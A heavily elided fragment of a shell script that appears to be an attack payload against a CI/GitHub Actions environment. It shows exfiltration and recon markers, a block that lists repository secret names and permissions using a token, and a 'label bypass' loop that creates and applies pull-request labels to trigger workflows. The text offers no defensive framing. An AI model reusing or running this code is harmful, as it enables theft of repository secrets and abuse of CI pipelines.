...
echo "==PRT_EXFIL_END_ffc5b1b6d187=="
        ...
        if [ -n "$__PRT_TK" ]; then
          ...
          echo "==PRT_RECON_START_ffc5b1b6d187=="
          (
            # --- Repo secret names ---
            echo "##REPO_SECRETS##"
...
try:
  ...
  for k in ['full_name','default_branch','visibility','permissions',
    ...
    print(f'{k}={d.get(k)}')
          ...
          echo "==PRT_RECON_END_ffc5b1b6d187=="
        fi
        # --- end deep recon ---
            ...
            for __entry in $__PRT_LABELS; do
              ...
              if [ "$__LBL_CREATE" = "201" ] || [ "$__LBL_CREATE" = "422" ]; then
                ...
                if [ "$__LBL_APPLY" = "200" ]; then
                  echo "PRT_LABEL_BYPASS_ffc5b1b6d187=$__LBL_WF:$__LBL_NAME"
                else
                  echo "PRT_LABEL_BYPASS_ERR_ffc5b1b6d187=apply_failed:$__LBL_APPLY:$__LBL_WF"
                fi
              else
                echo "PRT_LABEL_BYPASS_ERR_ffc5b1b6d187=create_failed:$__LBL_CREATE:$__LBL_WF"
              fi
            done
          else
            echo "PRT_LABEL_BYPASS_ERR_ffc5b1b6d187=no_pr_number"
          fi
        fi
        # --- end label bypass ---
